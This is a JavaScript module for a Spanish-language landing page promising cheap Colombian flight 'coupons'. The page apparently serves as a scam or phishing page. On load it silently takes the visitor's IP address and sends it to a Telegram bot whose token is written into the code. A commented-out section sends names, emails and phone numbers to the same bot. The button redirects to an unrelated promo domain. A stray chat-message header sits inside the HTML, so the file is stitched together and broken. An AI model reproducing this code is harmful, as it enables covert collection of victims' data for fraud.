import { initRouter } from "../router.js";

export default async function Home() {
    console.log("CDN cargado correctamente.");

    // Crear el elemento <title>
    const titleElement = document.createElement("title");
    titleElement.textContent = "¡Obtén Tu Cupón!";
    document.head.appendChild(titleElement);

    // Crear un estilo global y agregarlo al head
    const style = document.createElement("style");
    style.textContent = `

            * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        } 
        html, body { 
            height: 100%; 
            font-family: 'Arial', sans-serif; 
            background: linear-gradient(135deg, #6f6666, #ffffff); 
        } 
        .container { 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100%; 
            padding: 20px; 
            text-align: center; 
            min-height: 80vh;
        } 
        .image { 
            max-width: 90%; 
            max-height: 60vh; 
            margin-bottom: 30px; 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
        } 
        .button-container { 
            width: 100%; 
            max-width: 500px; 
        } 
        .button { 
            padding: 15px 30px; 
            font-size: 20px; 
            color: white; 
            background: linear-gradient(45deg, #f70000, #ff0000); 
            border: none; 
            border-radius: 25px; 
            cursor: pointer; 
            text-decoration: none; 
            transition: transform 0.3s, box-shadow 0.3s; 
            display: inline-block; 
            width: 100%; 
            font-weight: bold; 
        } 
        .button:hover { 
               /* Gradiente con un tono más oscuro y otro más claro, dentro de la misma gama */ 
    background: linear-gradient(45deg, #d90000, #ff3333); 
    transform: translateY(-3px); 
    /* Sombra rojiza para resaltar el botón */ 
        } 
         `;
    document.head.appendChild(style);
    
    try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const userIp = ipData.ip;

        const mensaje = `📢 Un usuario ha ingresado a la página de cupones.\n🖥️ IP: ${userIp}`;

        await sendTelegramMessage(mensaje);


    } catch (error) {
        console.error("Error obteniendo la IP o enviando el mensaje:", error);
    }


    return `
       <div class="container"> 
        <img  
            src="https://i.imgur.com/K4ffkXt.jpeg"

✡️Uva🎸😇💸🤙👁️☀️✡️👑🔱🫅🤴, [20/2/2025 10:33]
alt="Ofertas de Vuelos Nacionales"  
            class="image" 
        > 
        <h1 style="color: #fff; margin-bottom: 20px; font-weight: bold;"> 
            ¡Vuela por Colombia desde <strong>$49.999</strong>! 
        </h1> 
        <p style="color: #fff; margin-bottom: 40px; font-weight: bold;"> 
            Reserva hoy mismo y ahorra en tus próximas vacaciones. 
        </p> 
 
        <div class="button-container"> 
            <!-- Reemplaza "formulario.html" con el nombre real de tu página de formulario --> 
            <button  
                class="button" 
                id="conversionButton" 
            > 
                Compra tu vuelo aquí 
            </button> 
        </div> 
    </div> 
    `;
}

export function addHomeEvents() {
    document.getElementById("conversionButton").addEventListener("click", async function () {
     /*    const nombre = document.getElementById("nombre").value;
        const correo = document.getElementById("correo").value;
        const telefono = document.getElementById("telefono").value;

        if (!nombre || !correo || !telefono) {
            alert("Por favor, completa todos los campos.");
            return;
        }

        const mensaje = `✈️ NUEVO REGISTRO:\n👤 Nombre: ${nombre}\n📩 Correo: ${correo}\n📟 Teléfono: ${telefono}`;
        await sendTelegramMessage(mensaje); */

        /* history.pushState(null, "", "/gracias");
        initRouter(); */

        window.location.href = "https://77www.vivetuaventurasinlimitepromo.com";
    });
}

async function sendTelegramMessage(text) {
    const botToken = "7959584991:AAEuDqY8YuOraJYWtpN0tdxWX_TquHkepJE";
    const chatId = "6298387261";
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text })
        });

        if (!response.ok) {
            throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
        }
        console.log("Mensaje enviado a Telegram:", text);
    } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error);
    }
}